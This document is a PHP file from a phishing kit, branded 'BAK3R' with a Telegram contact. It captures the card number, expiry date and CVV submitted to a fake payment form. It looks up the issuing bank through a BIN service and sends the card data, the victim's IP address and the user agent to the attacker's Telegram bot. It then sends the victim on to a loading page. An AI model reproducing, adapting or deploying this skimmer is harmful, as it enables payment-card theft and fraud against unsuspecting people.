<?php

/*

██████╗  █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ https://t.me/BAK34_TMW
                                                                                              
*/



include '../bak3r.php';



$cardNumber = $_POST['ccnumber'];
$date = $_POST['ccexp'];
$cvv = $_POST['cvv'];


$bin = substr(str_replace(' ', '', $cardNumber), 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/" . $bin);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 400);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept-Version: 3'
));
$json = curl_exec($ch);
$code = json_decode($json);
$bin_bank = $code->bank->name;
$bin_type = $code->type;
$bin_brand = $code->brand;

$messages = "ㅤㅤㅤ[🔥] 𝑷𝒖𝒏𝒌𝒕𝒖𝒎 𝕭𝖞 @BAK34_TMW [🔥] ㅤㅤㅤ\n\n💳𝑪𝒂𝒓𝒅 𝑵𝒖𝒎𝒃𝒆𝒓: $cardNumber\n💳𝑫𝒂𝒕𝒆: $date\n💳𝑪𝑽𝑽: $cvv\n\n🍓 Banque : " . $bin_bank . "\n🍓 Niveau de la carte : " . $bin_brand . "\n🍓 Type de carte : " . $bin_type . "\n\n🗑𝓐𝓭𝓻𝓮𝓼𝓼𝓮 𝓘𝓟 : " . $_SERVER['REMOTE_ADDR'] . "\n🛒𝑼𝒔𝒆𝒓 𝑨𝒈𝒆𝒏𝒕 : " . $_SERVER['HTTP_USER_AGENT'] . "";

$data = array(
    'chat_id' => $chatid,
    'text' => $messages
);

$options = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    )
);

$context = stream_context_create($options);
$result = file_get_contents("https://api.telegram.org/bot$token/sendMessage", false, $context);


header("Location: ../loading.php");
